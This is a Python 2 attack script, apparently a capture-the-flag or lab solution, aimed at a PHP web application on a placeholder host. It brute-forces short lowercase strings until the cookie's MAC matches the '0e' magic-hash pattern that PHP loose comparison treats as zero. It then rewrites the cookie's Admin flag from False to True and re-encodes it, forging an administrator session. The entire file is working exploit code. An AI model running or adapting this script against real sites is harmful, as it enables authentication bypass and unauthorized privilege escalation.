#!/usr/bin/python

import requests, string, base64, json, sys, re
from itertools import chain, product

def bruteforce(charset, maxlength):
    return (''.join(candidate)
            for candidate in chain.from_iterable(product(charset, repeat=i)
                for i in range(1, maxlength + 1)))

initcookie = 'eyJVc2VyIjoiIiwiQWRtaW4iOiJGYWxzZSIsIk1BQyI6IjlkYWYyOTM4YjZlNzEzMDVkNmQyN2JlNWFkYmYxMGIxIn0%3D'

print "[*] Searching for MAC value that matches regex '0+[eE]\d+' for type juggling..."

for attempt in bruteforce(string.ascii_lowercase, 5):
    sys.stdout.write("\r[%] Current position: " + attempt)
    sys.stdout.flush()

    url = 'http://1.2.3.4/blah.php'
    data = {
            'fuckhtml':attempt
            }
    headers = {
            'Referer':'http://1.2.3.4/blah.php',
            'Cookie':'ses=' + initcookie
            }
    r = requests.post(url, data=data, headers=headers)
    scookie = r.headers['Set-Cookie'][4:]

    if "%3D" in scookie:
        matchcookie = re.sub('%3D', '=', scookie)
        decookie = matchcookie.decode('base64')
    else:
        decookie = scookie.decode('base64')

    parsed = json.loads(decookie)
    hmac = parsed["MAC"]
    if re.match('0+[eE]\d', hmac) is not None:
        print "\n[!] User string found: " + attempt
        print "[!] Resulting MAC value: " + hmac
        break

print "[*] Creating new cookie"
subcookie = re.sub('False', 'True', decookie)
print "[*] New cookie before encoding: " + subcookie
#I had to import base64 specifically for this because of a newline.  Thanks MIME. >.>
encookie = base64.b64encode(subcookie)
print "[*] New cookie after encoding: ",
if "=" in encookie:
    newcookie = re.sub('=', '%3D', encookie)
    print newcookie
else:
    print encookie
